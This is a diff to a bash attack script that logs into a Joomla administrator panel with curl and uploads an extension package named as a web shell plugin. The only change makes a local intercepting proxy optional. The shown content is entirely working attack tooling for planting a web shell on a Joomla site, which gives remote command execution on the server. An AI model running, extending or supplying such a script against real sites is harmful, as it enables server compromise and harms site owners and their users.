@@ -37,7 +37,12 @@ login_joomla() {
     fi
     local hidden_inputs=$(get_post_hidden_inputs)
     local post_data="username=$username&passwd=$password&$hidden_inputs"
-    response=$(curl -L -b $cookie_jar -c $cookie_jar -s -d "$post_data" "$target_url" --proxy localhost:8080)
+    if [[ -z $use_proxy ]] || [[ $use_proxy == "false" ]]; then
+        proxy_option=""
+    else
+        proxy_option="--proxy localhost:8080"
+    fi
+    response=$(curl -L -b $cookie_jar -c $cookie_jar -s -d "$post_data" "$target_url" $proxy_option)
     if [[ -z $response ]]; then
         echo "No response from server."
         return 1
@@ -68,10 +73,15 @@ upload_joomla_extension() {
         echo $hidden_inputs
     fi
     webshell_location="joomla_webshell/dist/joomla-webshell-plugin-1.1.0.zip"
+    if [[ -z $use_proxy ]] || [[ $use_proxy == "false" ]]; then
+        proxy_option=""
+    else
+        proxy_option="--proxy localhost:8080"
+    fi
     if [[ -f $webshell_location ]]; then
         echo "Uploading Joomla extension..."
         other_form_data="-F install_directory=/var/www/html/joomla/tmp -F install_url= -F installtype=upload"
-        response=$(curl -L -b $cookie_jar -c $cookie_jar -s -F "install_package=@$webshell_location;type=application/zip" $hidden_inputs $other_form_data "$target_url" --proxy localhost:8080)
+        response=$(curl -L -b $cookie_jar -c $cookie_jar -s -F "install_package=@$webshell_location;type=application/zip" $hidden_inputs $other_form_data "$target_url" $proxy_option)
         if [[ $response == *"Installation of the module was successful"* ]]; then
             echo "Joomla extension uploaded successfully."
             return 0
